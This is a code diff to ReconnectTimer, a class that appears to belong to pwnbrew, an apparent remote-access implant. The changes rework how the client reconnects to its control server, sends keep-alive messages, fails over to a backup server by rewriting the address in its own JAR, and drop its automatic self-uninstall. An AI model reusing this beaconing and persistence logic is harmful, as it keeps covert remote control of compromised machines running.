@@ -55,13 +55,14 @@ import java.util.Timer;
 import java.util.TimerTask;
 import java.util.logging.Level;
 import pwnbrew.ClientConfig;
-import pwnbrew.Persistence;
 import pwnbrew.log.RemoteLog;
-import pwnbrew.log.LoggableException;
+import pwnbrew.manager.DataManager;
 import pwnbrew.manager.PortManager;
 import pwnbrew.network.ClientPortRouter;
+import pwnbrew.network.Message;
 import pwnbrew.network.ReconnectCallback;
-import pwnbrew.network.control.ControlMessageManager;
+import pwnbrew.network.control.messages.NoOp;
+import pwnbrew.selector.SocketChannelHandler;
 
 /**
  *
@@ -69,7 +70,8 @@ import pwnbrew.network.control.ControlMessageManager;
  */
 public class ReconnectTimer extends ManagedRunnable {
     
-    private PortManager theCommManager = null;
+    private final PortManager theCommManager;
+    private Message postConnectMsg = null;
     
     //Static instance
     private final Queue<String> theReconnectTimeList = new LinkedList<>();    
@@ -86,11 +88,24 @@ public class ReconnectTimer extends ManagedRunnable {
     /**
      * Constructor
      *
+     * @param passedManager
      * @param channelId
     */
-    public ReconnectTimer( int channelId ) {
+    public ReconnectTimer( PortManager passedManager, int channelId ) {
         super(Constants.Executor);
+        theCommManager = passedManager;
         theChannelId = channelId;
+    }
+    
+    // ==========================================================================
+    /**
+     *   Sets the message to be queued after connection
+     * @param passedMsg
+    */
+    public synchronized void setPostConnectMessage( Message passedMsg ) {
+
+        postConnectMsg = passedMsg;  
+        
     }
     
      // ==========================================================================
@@ -117,18 +132,6 @@ public class ReconnectTimer extends ManagedRunnable {
      
     // ==========================================================================
     /**
-     *   Sets the detector provider
-     * @param passedProvider
-    */
-    public synchronized void setCommManager( PortManager passedProvider ) {
-
-        if( passedProvider != null )
-            theCommManager = passedProvider;  
-        
-    }/* END setCommManager() */
-
-    // ==========================================================================
-    /**
      *  Main thread loop
      *
     */
@@ -137,7 +140,7 @@ public class ReconnectTimer extends ManagedRunnable {
         
         int connected = 0;
               
-        DebugPrinter.printMessage(NAME_Class, "ReconnectTimer started.");
+        DebugPrinter.printMessage(NAME_Class, "ReconnectTimer started for channel " + Integer.toString(theChannelId));
         //Get the socket router
         ClientConfig theConf = ClientConfig.getConfig();
         String serverIp = theConf.getServerIp();
@@ -192,13 +195,33 @@ public class ReconnectTimer extends ManagedRunnable {
                     
                     waitUntil(theDate);  
                     aPR.ensureConnectivity( theCC, theChannelId );
-                    DebugPrinter.printMessage(NAME_Class, "ReconnectTimer waiting to be notified.");
+                    //DebugPrinter.printMessage(NAME_Class, "ReconnectTimer waiting to be notified.");
                     waitToBeNotified();
+                    
+                    //Queue post connect msg if it exists
+                    if( postConnectMsg != null){
+                        DataManager.send( theCommManager, postConnectMsg );
+                        postConnectMsg = null;
+                    }
                     
                     //Get the channel id
                     connected = theCC.getChannelId();
-                    DebugPrinter.printMessage(NAME_Class, "ReconnectTimer notified. Connected: " + connected);
+                    //DebugPrinter.printMessage(NAME_Class, "ReconnectTimer notified. Connected: " + connected);
                     theDate = null;
+                    
+                    //Send & Receive message
+                    SocketChannelHandler aSCH =  aPR.getConnectionManager().getSocketChannelHandler(connected);
+                    if( aSCH != null ){
+                        if(aSCH.getQueueSize() == 0 ){
+                            NoOp aNoOp = new NoOp();
+                            aNoOp.setChannelId(connected);
+                            DataManager.send( theCommManager, aNoOp);    
+                        }
+                        aSCH.signalSend();
+                    } else {
+                        DebugPrinter.printMessage(NAME_Class, "SocketChannelHandler is null");
+                        connected = 0;
+                    }
                    
                 } else  {
                     break;
@@ -210,44 +233,34 @@ public class ReconnectTimer extends ManagedRunnable {
             RemoteLog.log(Level.SEVERE, NAME_Class, "start()", ex.getMessage(), ex);
         }
         
-        //Uninstall
-        if( connected == 0 ){
-            
-            if( backupServerIp != null && backupServerPort != -1 ){
-                
-                theCC = new ReconnectCallback(backupServerIp, backupServerPort, this); 
-                aPR.ensureConnectivity(theCC, theChannelId);
-                waitToBeNotified();
-                    
-                //Get the channel id
-                connected = theCC.getChannelId();
-                if( connected != 0 ){
-                    
-                    theConf.setServerIp(backupServerIp);
-                    theConf.setSocketPort( Integer.toString( backupServerPort ));
-                    
-                    try {
-                        //Set JAR conf back to old IP
-                        Utilities.updateServerInfoInJar(backupServerIp +":"+ Integer.toString( backupServerPort));
-                    } catch (ClassNotFoundException | IOException ex) {
-                        RemoteLog.log(Level.SEVERE, NAME_Class, "go()", ex.getMessage(), ex);
-                    }
-                                        
-                    //Reset things
-                    theReconnectTimeList.clear();
-                    backupServerIp = null;
-                    backupServerPort = -1;
-                    return;
-                }               
-            }
-            
-            //Uninstall
-            Persistence.uninstall( (PortManager)theCommManager);    
-            
-        } else {
-            
-            DebugPrinter.printMessage(NAME_Class, "Connection made, ReconnectTimer finished.");
-        }   
+        //Check if there is an alternate server IP/Port
+        if( backupServerIp != null && backupServerPort != -1 ){
+
+            theCC = new ReconnectCallback(backupServerIp, backupServerPort, this); 
+            aPR.ensureConnectivity(theCC, theChannelId);
+            waitToBeNotified();
+
+            //Get the channel id
+            connected = theCC.getChannelId();
+            if( connected != 0 ){
+
+                theConf.setServerIp(backupServerIp);
+                theConf.setSocketPort( Integer.toString( backupServerPort ));
+
+                try {
+                    //Set JAR conf back to old IP
+                    Utilities.updateServerInfoInJar(backupServerIp +":"+ Integer.toString( backupServerPort));
+                } catch (ClassNotFoundException | IOException ex) {
+                    RemoteLog.log(Level.SEVERE, NAME_Class, "go()", ex.getMessage(), ex);
+                }
+
+                //Reset things
+                theReconnectTimeList.clear();
+                backupServerIp = null;
+                backupServerPort = -1;
+                return;
+            }               
+        }
      
         //Reset things
         theReconnectTimeList.clear();
@@ -274,7 +287,7 @@ public class ReconnectTimer extends ManagedRunnable {
             }
         };
         
-        DebugPrinter.printMessage(NAME_Class, "Trying to connect again at " + date.toString());
+        //DebugPrinter.printMessage(NAME_Class, "Trying to connect again at " + date.toString());
         //Create a timer
         Timer aTimer = new Timer();
         aTimer.schedule(aTimerTask, date);
